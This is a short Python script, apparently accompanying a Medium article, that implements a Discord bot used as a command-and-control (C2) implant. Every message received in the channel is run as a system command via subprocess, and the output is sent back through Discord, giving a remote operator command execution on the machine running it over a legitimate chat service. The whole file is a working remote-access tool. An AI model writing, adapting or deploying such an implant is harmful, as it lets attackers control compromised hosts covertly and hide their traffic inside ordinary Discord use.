# https://medium.com/@lsecqt/using-discord-as-command-and-control-c2-with-python-and-nuitka-8fdced161fdd

from discord.ext import commands
from discord.utils import get
from discord.ext.commands import Bot
import discord
from discord.utils import get
import subprocess
import time

DISCORD_TOKEN = "REDACTED_TOKEN"

def Exec(cmd):
    output = subprocess.check_output(cmd, shell=False)
    return output


intents = discord.Intents.all()
intents.members = True
intents.reactions = True
intents.guilds = True
bot = Bot("!", intents=intents)



@bot.command()
async def IssueCmd(ctx, arg):
    await ctx.send(arg)

@bot.event
async def on_message(message):   
    await message.channel.send(Exec(message.content).decode("utf-8"))

if __name__ == "__main__":

    bot.run(DISCORD_TOKEN)